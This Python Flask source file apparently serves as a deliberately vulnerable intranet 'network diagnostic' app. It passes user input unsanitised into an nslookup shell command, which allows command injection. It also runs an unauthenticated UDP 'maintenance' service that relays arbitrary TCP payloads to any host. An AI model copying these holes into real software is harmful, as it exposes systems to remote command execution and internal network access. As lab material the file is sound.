import socket
import base64
import os
import time
from flask import Flask, request, render_template_string

class Config:
    BIND_IP = '0.0.0.0'
    PORT = 7777
    MAINTENANCE_PORT = 8888
    BLACKLISTED_DOMAINS = {"internal.corp", "confidential.local"}

class LegacySystemUtils:
    def __init__(self, config):
        self.start_time = time.time()
        self.config = config

    def get_system_status(self):
        uptime = time.time() - self.start_time
        return {
            "service_status": "Running",
            "uptime_seconds": round(uptime, 2),
            "version": "1.0.3-legacy"
        }

    def execute_diagnostic(self, target):
        print(f"Executing diagnostic for target: {target}")
        if any(domain in target for domain in self.config["BLACKLISTED_DOMAINS"]):
            return "Error: Target domain is blacklisted for security reasons."
        base_command = "nslookup"
        command = f"{base_command} {target}"
        try:
            result_stream = os.popen(command)
            output = result_stream.read()
        except Exception as e:
            output = f"A system error occurred during execution: {e}"
        return output

BASE_TEMPLATE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Legacy Network Tools</title>
    <style>
      body { font-family: "Courier New", monospace; background-color: #f0f0f0; color: #333; }
      .container { max-width: 800px; margin: 40px auto; padding: 20px; background-color: #fff; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
      h1, h2 { color: #005a9c; border-bottom: 2px solid #ccc; padding-bottom: 10px;}
      nav { margin-bottom: 20px; }
      nav a { margin-right: 15px; text-decoration: none; color: #005a9c; }
      form { margin-top: 20px; }
      input[type=text] { width: 70%; padding: 8px; font-family: inherit; }
      input[type=submit] { padding: 8px 15px; background-color: #005a9c; color: white; border: none; cursor: pointer; }
      pre { background-color: #eee; padding: 15px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word; }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Legacy Corp Intranet</h1>
      <nav><a href="/">Diagnostics</a> | <a href="/status">System Status</a></nav>
      {{ content|safe }}
    </div>
  </body>
</html>
"""

DIAG_CONTENT = """
<h2>Network Diagnostic Tool</h2>
<p>Enter a hostname to perform a DNS lookup.</p>
<form method="post">
  <input type="text" name="target_host" placeholder="e.g., example.com" value="{{ user_input }}">
  <input type="submit" value="Run Lookup">
</form>
{% if output %}
  <h3>Results:</h3>
  <pre>{{ output }}</pre>
{% endif %}
"""

STATUS_CONTENT = """
<h2>System Status</h2>
<pre>
Service Status: {{ status.service_status }}
Version: {{ status.version }}
Uptime (seconds): {{ status.uptime_seconds }}
</pre>
"""

class MaintenanceService:
    def __init__(self, host='0.0.0.0'):
        self.host = host
        self.maintenance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.maintenance_socket.bind((host, Config.MAINTENANCE_PORT))
        print(f"Maintenance service listening on {host}:{Config.MAINTENANCE_PORT}")
    
    def run(self):
        print(f"MaintenanceService starting on {self.host}")
        
        while True:
            try:
                data, addr = self.maintenance_socket.recvfrom(4096)
                source_ip = addr[0]
                
                try:
                    payload_str = data.decode('utf-8', errors='ignore')
                    print(f"Maintenance request from {source_ip}, payload: {payload_str}")
                    
                    decoded = base64.b64decode(payload_str).decode('utf-8')
                    print(f"Decoded request: {decoded}")
                    
                    if ':' in decoded:
                        parts = decoded.split(':', 2)
                        if len(parts) == 3:
                            target_ip, target_port, tcp_payload = parts
                            target_port = int(target_port)
                            print(f"Processing maintenance task: {target_ip}:{target_port}")
                            
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(5)
                                print(f"Connecting to {target_ip}:{target_port}...")
                                sock.connect((target_ip, target_port))
                                print(f"Connected successfully, sending request...")
                                sock.send(tcp_payload.encode())
                                
                                response = sock.recv(4096)
                                sock.close()
                                print(f"Received {len(response)} bytes from target")
                                
                                try:
                                    response_text = response.decode('utf-8', errors='ignore')
                                    print(f"Response: {response_text}")
                                    
                                    reply_data = base64.b64encode(f"OK:{response_text}".encode()).decode()
                                    print(f"Sending maintenance response: {reply_data}")
                                    
                                    self.maintenance_socket.sendto(reply_data.encode(), addr)
                                    print(f"Maintenance response sent to {source_ip}")
                                except Exception as e:
                                    print(f"Error constructing response: {e}")
                            except ConnectionRefusedError:
                                print(f"Connection refused to {target_ip}:{target_port}")
                            except socket.timeout:
                                print(f"Connection timeout to {target_ip}:{target_port}")
                            except Exception as e:
                                print(f"Error during maintenance task: {e}")
                        else:
                            print("Invalid maintenance request format (need target_ip:target_port:payload)")
                    else:
                        print("Request doesn't contain expected format (no ':' found)")
                except Exception as e:
                    print(f"Not processing this maintenance request (decode failed)")
            except Exception as e:
                print(f"Error receiving maintenance request: {e}")


app = Flask(__name__)
app.config['BIND_IP'] = Config.BIND_IP
app.config['PORT'] = Config.PORT
app.config['BLACKLISTED_DOMAINS'] = Config.BLACKLISTED_DOMAINS

@app.route('/', methods=['GET', 'POST'])
def diagnostic_tool():
    output = ""
    user_input = ""
    utils = LegacySystemUtils(app.config)
    if request.method == 'POST':
        target_host = request.form.get('target_host', '')
        user_input = target_host
        if target_host:
            output = utils.execute_diagnostic(target_host)
    inner = render_template_string(DIAG_CONTENT, output=output, user_input=user_input)
    return render_template_string(BASE_TEMPLATE, content=inner)

@app.route('/diagnostic', methods=['POST'])
def diagnostic_post():
    utils = LegacySystemUtils(app.config)
    target_host = request.form.get('target_host', '')
    if target_host:
        output = utils.execute_diagnostic(target_host)
        return output
    return "No target specified"

@app.route('/status')
def status_page():
    utils = LegacySystemUtils(app.config)
    status_info = utils.get_system_status()
    inner = render_template_string(STATUS_CONTENT, status=status_info)
    return render_template_string(BASE_TEMPLATE, content=status_info)

if __name__ == '__main__':
    import threading
    
    maintenance_service = MaintenanceService()
    maintenance_thread = threading.Thread(target=maintenance_service.run, daemon=True)
    maintenance_thread.start()
    
    app.run(host=app.config['BIND_IP'], port=app.config['PORT'], debug=False, use_reloader=False)